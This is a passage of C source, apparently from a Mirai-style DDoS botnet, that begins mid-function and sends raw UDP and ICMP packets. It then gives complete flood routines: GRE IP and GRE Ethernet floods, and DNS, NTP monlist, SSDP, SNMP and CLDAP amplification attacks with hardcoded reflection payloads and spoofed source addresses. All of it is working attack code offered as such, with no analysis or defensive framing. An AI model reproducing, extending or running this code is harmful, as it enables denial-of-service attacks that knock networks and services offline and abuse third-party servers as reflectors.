            iph = (struct iphdr *)packet_udp;
            udph = (struct udphdr *)(iph + 1);
            iph->daddr = addr_sin.sin_addr.s_addr;
            udph->source = htons(sport);
            udph->check = 0;
            payload_udp[0] = (rand_next() >> 8) & 0xFF;
            payload_udp[1] = rand_next() & 0xFF;
            rand_str(payload_udp + 4, payload_size - 4);
            iph->id = rand_next();
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            sendto(fd_udp, packet_udp, packet_size_udp, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));

            /* ICMP */
            iph = (struct iphdr *)packet_icmp;
            icmph = (struct icmphdr *)(iph + 1);
            iph->daddr = addr_sin.sin_addr.s_addr;
            icmph->un.echo.sequence = htons(rand_next() % 0xFFFF);
            icmph->checksum = 0;
            icmph->checksum = checksum_generic((uint16_t *)icmph, sizeof(struct icmphdr) + 64);
            iph->id = rand_next();
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            sendto(fd_icmp, packet_icmp, packet_size_icmp, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload_tcp); free(payload_udp); free(payload_icmp);
    free(packet_tcp); free(packet_udp); free(packet_icmp);
    close(fd_tcp);
    close(fd_udp);
    close(fd_icmp);
}

/* ============================================================================
 * GRE IP FLOOD
 * ============================================================================ */
static void attack_gre_ip(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    uint16_t dport;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);

    pktsize = sizeof(struct iphdr) + 4 + sizeof(struct iphdr) + sizeof(struct udphdr) + 512;
    pktbuf = malloc(pktsize);
    util_zero(pktbuf, pktsize);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) {
        free(pktbuf);
        return;
    }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    for (i = 0; i < targs_len; i++) {
        while (attack_ongoing[0]) {
            struct iphdr *outer_ip = (struct iphdr *)pktbuf;
            uint16_t *gre = (uint16_t *)(pktbuf + sizeof(struct iphdr));
            struct iphdr *inner_ip = (struct iphdr *)(pktbuf + sizeof(struct iphdr) + 4);

            outer_ip->ihl = 5;
            outer_ip->version = 4;
            outer_ip->tot_len = htons(pktsize);
            outer_ip->protocol = IPPROTO_GRE;
            outer_ip->saddr = LOCAL_ADDR;
            outer_ip->daddr = targs[i].addr.s_addr;
            outer_ip->ttl = 64;
            outer_ip->id = rand_next();

            gre[0] = 0;
            gre[1] = 0;
            gre[2] = htons(ETH_P_IP);

            inner_ip->ihl = 5;
            inner_ip->version = 4;
            inner_ip->tot_len = htons(pktsize - sizeof(struct iphdr) - 4);
            inner_ip->protocol = IPPROTO_UDP;
            inner_ip->saddr = rand_next();
            inner_ip->daddr = targs[i].addr.s_addr;
            inner_ip->ttl = 64;
            inner_ip->id = rand_next();

            struct udphdr *udp = (struct udphdr *)(inner_ip + 1);
            udp->source = htons(rand_next() % 0xFFFF);
            udp->dest = htons(dport != 0 ? dport : rand_next() % 0xFFFF);
            udp->len = htons(sizeof(struct udphdr) + 512);

            rand_str((char *)(udp + 1), 512);

            inner_ip->check = 0;
            inner_ip->check = checksum_generic((uint16_t *)inner_ip, sizeof(struct iphdr) / 2);

            sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)&targs[i], sizeof(targs[i]));
        }
    }

    free(pktbuf);
    close(fd);
}

/* ============================================================================
 * GRE ETH FLOOD
 * ============================================================================ */
static void attack_gre_eth(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    uint16_t dport;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);

    pktsize = sizeof(struct iphdr) + 4 + 6 + sizeof(struct iphdr) + sizeof(struct udphdr) + 512;
    pktbuf = malloc(pktsize);
    util_zero(pktbuf, pktsize);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) {
        free(pktbuf);
        return;
    }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    for (i = 0; i < targs_len; i++) {
        while (attack_ongoing[0]) {
            struct iphdr *outer_ip = (struct iphdr *)pktbuf;
            uint16_t *gre = (uint16_t *)(pktbuf + sizeof(struct iphdr));
            uint8_t *eth = (uint8_t *)(pktbuf + sizeof(struct iphdr) + 4);
            struct iphdr *inner_ip = (struct iphdr *)(pktbuf + sizeof(struct iphdr) + 4 + 6);

            outer_ip->ihl = 5;
            outer_ip->version = 4;
            outer_ip->tot_len = htons(pktsize);
            outer_ip->protocol = IPPROTO_GRE;
            outer_ip->saddr = LOCAL_ADDR;
            outer_ip->daddr = targs[i].addr.s_addr;
            outer_ip->ttl = 64;
            outer_ip->id = rand_next();

            gre[0] = 0;
            gre[1] = 0;
            gre[2] = htons(ETH_P_TEB);

            memset(eth, 0, 6);

            inner_ip->ihl = 5;
            inner_ip->version = 4;
            inner_ip->tot_len = htons(pktsize - sizeof(struct iphdr) - 4 - 6);
            inner_ip->protocol = IPPROTO_UDP;
            inner_ip->saddr = rand_next();
            inner_ip->daddr = targs[i].addr.s_addr;
            inner_ip->ttl = 64;
            inner_ip->id = rand_next();

            struct udphdr *udp = (struct udphdr *)(inner_ip + 1);
            udp->source = htons(rand_next() % 0xFFFF);
            udp->dest = htons(dport != 0 ? dport : rand_next() % 0xFFFF);
            udp->len = htons(sizeof(struct udphdr) + 512);

            rand_str((char *)(udp + 1), 512);

            inner_ip->check = 0;
            inner_ip->check = checksum_generic((uint16_t *)inner_ip, sizeof(struct iphdr) / 2);

            sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)&targs[i], sizeof(targs[i]));
        }
    }

    free(pktbuf);
    close(fd);
}

/* ============================================================================
 * AMPLIFICATION ATTACKS
 * ============================================================================ */

/* DNS Amplification Payload - ANY query for google.com */
static char dns_amp_payload[] = {
    0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x06, 0x67, 0x6f, 0x6f, 0x67, 0x6c, 0x65, 0x03, 0x63, 0x6f, 0x6d, 0x00,
    0x00, 0xff, 0x00, 0x01
};

static void attack_dns_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    uint16_t payload_size = sizeof(dns_amp_payload);
    char *packet;
    int packet_size;
    struct iphdr *iph;
    struct udphdr *udph;
    uint16_t sport;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;
    packet = malloc(packet_size);
    util_zero(packet, packet_size);

    iph = (struct iphdr *)packet;
    udph = (struct udphdr *)(iph + 1);

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(packet_size);
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->saddr = rand_next();

    udph->source = htons(sport);
    udph->dest = htons(53);
    udph->len = htons(sizeof(struct udphdr) + payload_size);

    memcpy((char *)(udph + 1), dns_amp_payload, payload_size);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(packet); return; }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->daddr = addr_sin.sin_addr.s_addr;

        while (attack_ongoing[0]) {
            dns_amp_payload[0] = rand_next() & 0xFF;
            dns_amp_payload[1] = (rand_next() >> 8) & 0xFF;
            iph->id = rand_next();
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            udph->check = 0;
            udph->check = checksum_tcpudp(iph, (uint16_t *)udph, sizeof(struct udphdr), sizeof(struct udphdr) + payload_size);
            sendto(fd, packet, packet_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }
    free(packet);
    close(fd);
}

/* NTP Amplification Payload - monlist command */
static char ntp_amp_payload[] = {
    0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static void attack_ntp_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    uint16_t payload_size = sizeof(ntp_amp_payload);
    char *packet;
    int packet_size;
    struct iphdr *iph;
    struct udphdr *udph;
    uint16_t sport;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = (rand_next() % 0xFFFF) & 0xFF00;

    packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;
    packet = malloc(packet_size);
    util_zero(packet, packet_size);

    iph = (struct iphdr *)packet;
    udph = (struct udphdr *)(iph + 1);

    iph->ihl = 5; iph->version = 4;
    iph->tot_len = htons(packet_size);
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->saddr = rand_next();

    udph->source = htons(sport);
    udph->dest = htons(123);
    udph->len = htons(sizeof(struct udphdr) + payload_size);
    memcpy((char *)(udph + 1), ntp_amp_payload, payload_size);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(packet); return; }
    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->daddr = addr_sin.sin_addr.s_addr;
        while (attack_ongoing[0]) {
            iph->id = rand_next();
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            udph->check = 0;
            udph->check = checksum_tcpudp(iph, (uint16_t *)udph, sizeof(struct udphdr), sizeof(struct udphdr) + payload_size);
            sendto(fd, packet, packet_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }
    free(packet);
    close(fd);
}

/* SSDP Amplification Payload - M-SEARCH */
static char ssdp_amp_payload[] = {
    0x4d, 0x2d, 0x53, 0x45, 0x41, 0x52, 0x43, 0x48, 0x20, 0x2a, 0x20, 0x48,
    0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x0d, 0x0a, 0x48, 0x4f, 0x53,
    0x54, 0x3a, 0x20, 0x32, 0x33, 0x39, 0x2e, 0x32, 0x35, 0x35, 0x2e, 0x32,
    0x35, 0x35, 0x2e, 0x32, 0x35, 0x30, 0x3a, 0x31, 0x39, 0x30, 0x30, 0x0d,
    0x0a, 0x4d, 0x41, 0x4e, 0x3a, 0x20, 0x22, 0x73, 0x73, 0x64, 0x70, 0x3a,
    0x64, 0x69, 0x73, 0x63, 0x6f, 0x76, 0x65, 0x72, 0x22, 0x0d, 0x0a, 0x4d,
    0x58, 0x3a, 0x33, 0x0d, 0x0a, 0x53, 0x54, 0x3a, 0x20, 0x75, 0x72, 0x6e,
    0x3a, 0x73, 0x63, 0x68, 0x65, 0x6d, 0x61, 0x73, 0x2d, 0x75, 0x70, 0x6e,
    0x70, 0x2d, 0x6f, 0x72, 0x67, 0x3a, 0x64, 0x65, 0x76, 0x69, 0x63, 0x65,
    0x3a, 0x61, 0x6c, 0x6c, 0x0d, 0x0a, 0x0d, 0x0a
};

static void attack_ssdp_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    uint16_t payload_size = sizeof(ssdp_amp_payload);
    char *packet;
    int packet_size;
    struct iphdr *iph;
    struct udphdr *udph;
    uint16_t sport;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;
    packet = malloc(packet_size);
    util_zero(packet, packet_size);

    iph = (struct iphdr *)packet;
    udph = (struct udphdr *)(iph + 1);
    iph->ihl = 5; iph->version = 4;
    iph->tot_len = htons(packet_size);
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->saddr = rand_next();

    udph->source = htons(sport);
    udph->dest = htons(1900);
    udph->len = htons(sizeof(struct udphdr) + payload_size);
    memcpy((char *)(udph + 1), ssdp_amp_payload, payload_size);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(packet); return; }
    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->daddr = addr_sin.sin_addr.s_addr;
        while (attack_ongoing[0]) {
            iph->id = rand_next();
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            udph->check = 0;
            udph->check = checksum_tcpudp(iph, (uint16_t *)udph, sizeof(struct udphdr), sizeof(struct udphdr) + payload_size);
            sendto(fd, packet, packet_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }
    free(packet);
    close(fd);
}

/* SNMP Amplification Payload - GETBULK */
static char snmp_amp_payload[] = {
    0x30, 0x31, 0x02, 0x01, 0x00, 0x04, 0x06, 0x70, 0x75, 0x62, 0x6c, 0x69,
    0x63, 0xa7, 0x24, 0x02, 0x04, 0x00, 0x00, 0x00, 0x00, 0x02, 0x01, 0x00,
    0x02, 0x01, 0x00, 0x30, 0x16, 0x30, 0x14, 0x06, 0x00, 0x06, 0x0e, 0x2b,
    0x06, 0x01, 0x04, 0x01, 0x92, 0x2b, 0x01, 0x01, 0x01, 0x01, 0x80, 0x00,
    0x00, 0x00, 0x00, 0xa0, 0x00, 0x00, 0x00, 0x00
};

static void attack_snmp_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    uint16_t payload_size = sizeof(snmp_amp_payload);
    char *packet;
    int packet_size;
    struct iphdr *iph;
    struct udphdr *udph;
    uint16_t sport;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;
    packet = malloc(packet_size);
    util_zero(packet, packet_size);

    iph = (struct iphdr *)packet;
    udph = (struct udphdr *)(iph + 1);
    iph->ihl = 5; iph->version = 4;
    iph->tot_len = htons(packet_size);
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->saddr = rand_next();

    udph->source = htons(sport);
    udph->dest = htons(161);
    udph->len = htons(sizeof(struct udphdr) + payload_size);
    memcpy((char *)(udph + 1), snmp_amp_payload, payload_size);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(packet); return; }
    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->daddr = addr_sin.sin_addr.s_addr;
        while (attack_ongoing[0]) {
            iph->id = rand_next();
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            udph->check = 0;
            udph->check = checksum_tcpudp(iph, (uint16_t *)udph, sizeof(struct udphdr), sizeof(struct udphdr) + payload_size);
            sendto(fd, packet, packet_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }
    free(packet);
    close(fd);
}

/* CLDAP Amplification Payload - LDAP search */
static char cldap_amp_payload[] = {
    0x30, 0x3f, 0x02, 0x01, 0x63, 0x63, 0x3a, 0x04, 0x00, 0xa1, 0x00, 0xa2,
    0x00, 0x30, 0x00, 0x30, 0x29, 0x04, 0x00, 0x30, 0x23, 0x04, 0x00, 0x04,
    0x00, 0x04, 0x00, 0x04, 0x00, 0x04, 0x00, 0x04, 0x00, 0x04, 0x00, 0x04,
    0x00, 0x04, 0x00, 0x04, 0x00, 0x04, 0x00, 0x04, 0x00, 0x04, 0x00, 0x04,
    0x00, 0x04, 0x00, 0x04, 0x00, 0x04, 0x00
};

static void attack_cldap_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    uint16_t payload_size = sizeof(cldap_amp_payload);
    char *packet;
    int packet_size;
    struct iphdr *iph;
    struct udphdr *udph;
    uint16_t sport;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;
    packet = malloc(packet_size);
    util_zero(packet, packet_size);

    iph = (struct iphdr *)packet;
    udph = (struct udphdr *)(iph + 1);
    iph->ihl = 5; iph->version = 4;
    iph->tot_len = htons(packet_size);
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->saddr = rand_next();

    udph->source = htons(sport);
    udph->dest = htons(389);
    udph->len = htons(sizeof(struct udphdr) + payload_size);
    memcpy((char *)(udph + 1), cldap_amp_payload, payload_size);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(packet); return; }
    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->daddr = addr_sin.sin_addr.s_addr;
        while (attack_ongoing[0]) {
            iph->id = rand_next();
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            udph->check = 0;
            udph->check = checksum_tcpudp(iph, (uint16_t *)udph, sizeof(struct udphdr), sizeof(struct udphdr) + payload_size);
            sendto(fd, packet, packet_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }
    free(packet);
    close(fd);
}
